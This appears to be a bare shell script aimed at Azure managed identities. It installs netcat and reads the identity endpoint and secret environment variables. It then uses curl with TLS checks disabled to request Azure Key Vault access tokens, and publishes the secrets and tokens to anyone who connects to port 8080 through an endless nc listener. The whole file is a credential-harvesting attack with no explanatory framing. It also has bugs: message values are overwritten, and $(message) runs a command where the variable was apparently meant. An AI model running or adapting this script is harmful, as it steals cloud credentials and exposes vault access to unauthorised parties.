apt-get update
apt-get install netcat

message=""

message="IDENTITY_ENDPOINT $IDENTITY_ENDPOINT\n$message"
message="IDENTITY_HEADER $IDENTITY_HEADER\n$message"

response=$(curl --insecure $IDENTITY_ENDPOINT'?api-version=2019-08-01&resource=https://vault.azure.net/' -H "Secret: $IDENTITY_HEADER")

message="response $response\n$message"

message="MSI_ENDPOINT $MSI_ENDPOINT"
message="MSI_SECRET $MSI_SECRET"

response2=$(curl --insecure $MSI_ENDPOINT'?api-version=2017-09-01&resource=https://vault.azure.net/' -H "Secret: $MSI_SECRET")

message="response2 $response2\n$message"

while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n$(message)" | nc -l -p 8080; done